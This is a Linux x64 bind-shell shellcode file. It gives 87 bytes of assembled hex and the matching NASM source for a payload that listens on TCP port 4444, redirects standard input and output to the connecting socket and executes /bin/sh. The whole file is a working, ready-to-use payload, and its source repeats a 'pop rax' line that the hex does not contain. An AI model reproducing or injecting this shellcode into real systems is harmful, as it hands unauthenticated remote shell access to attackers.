; Title:    Linux x64 bind shell port 4444
; Platform: linux
; Arch:     x64
; Size:     87 bytes
; Encoding: raw
;
; Assembled hex:
; \x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05

BITS 64
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    push    0x29 ; pop rax
    pop     rax
    cdq
    push    0x2
    pop     rdi
    push    0x1
    pop     rsi
    syscall
    xchg    rdi, rax
    ; bind to port 4444
    push    rdx
    mov     dword [rsp], 0x5c110002  ; port 4444, AF_INET
    mov     rsi, rsp
    push    0x10
    pop     rdx
    push    0x31
    pop     rax
    syscall
    ; listen(sockfd, 1)
    push    0x1
    pop     rsi
    push    0x32
    pop     rax
    syscall
    ; accept(sockfd, 0, 0)
    xor     rsi, rsi
    push    0x2b
    pop     rax
    syscall
    xchg    rdi, rax
    ; dup2 loop
    push    0x3
    pop     rsi
dup_loop:
    dec     rsi
    push    0x21
    pop     rax
    syscall
    jne     dup_loop
    ; execve
    push    0x3b
    pop     rax
    cdq
    mov     rbx, 0x68732f6e69622f
    push    rbx
    mov     rdi, rsp
    push    rdx
    push    rdi
    mov     rsi, rsp
    syscall
